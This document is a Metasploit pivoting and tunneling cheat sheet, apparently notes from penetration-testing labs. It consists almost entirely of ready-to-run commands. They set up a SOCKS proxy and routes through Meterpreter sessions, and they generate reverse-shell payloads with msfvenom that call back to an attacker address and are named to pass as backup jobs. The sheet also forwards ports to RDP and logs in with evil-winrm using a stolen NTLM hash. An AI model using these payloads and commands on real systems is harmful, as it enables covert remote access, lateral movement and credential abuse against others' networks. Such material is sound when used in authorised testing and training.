# MSF Tunneling

#### Configuring MSF SOCKS Proxy

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set version 4a
run
```

**Confirm Proxy Server is Running**

```
jobs
```

* Add line to /etc/proxychains.conf if needed - for tools external to MSF to use this proxy

```
socks4 	127.0.0.1 9050
```

**Instruct socks\_proxy Module to Route All Traffic via Meterpreter Session**

```
use post/multi/manage/autoroute
set SESSION 2
set SUBNET 192.168.1.0 # IF MANUAL ENTRY DESIRED OTHERWISE IT WILL AUTO SELECT BASED ON HOST ROUTING TABLE
run
```

**Alternatively Add Routes from Meterpreter Session**

```
run autoroute -s 172.16.5.0/23
```

**List Active Routes**

```
run autoroute -p
```

#### Setup Auto Route

```
use multi/manage/autoroute
set session 1
exploit
```

#### Set Up Proxy

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 5
exploit -j
```

* Verify proxychains conf

***

### Routes

#### List Routes

```
route
```

#### Add Route

```
route add 10.9.10.0 255.255.255.0 1
route add 10.9.30.0 255.255.255.0 1
```

#### Delete Route

```
route del 172.16.237.0 255.255.255.0 1
```

### Meterpreter Tunneling & Port Forwarding

#### Meterpreter Tunneling and Port Forwarding

**Get Meterpreter Session on Pivot Host**

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.148 -f elf -o backupjob LPORT=8080
```

**Start msfconsole Listener**

```
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

**Execute Payload on Pivot Host**

```
chmod +x backupjob
./backupjob
```

**Ping Sweep from Meterpreter Session**

```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

***

### Local Port Forward

#### Port Forwarding - Executed from Meterpreter Session

```
help portfwd
```

**Local TCP Relay**

```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

* `-l 3300` - Listener on attack machine to forward 3300 to 3389 on `-r` IP

**Connect via RDP**

```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Evil-WinRM**

```
evil-winrm -i 127.0.0.1 -P 5999 -u administrator -H 'f7c883121d0f63ee5b4312ba7572689b'
```

***

### Remote Port Forward

#### Reverse Port Forwarding - Executed from Meterpreter Session

```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.148
```

* 1234 listener on pivot host will forward to 10.10.14.148:8081

**Background Session and Start multi/handler**

```
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run
```

**Generate Payload**

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

* Transfer and execute payload on Windows host to get Meterpreter session
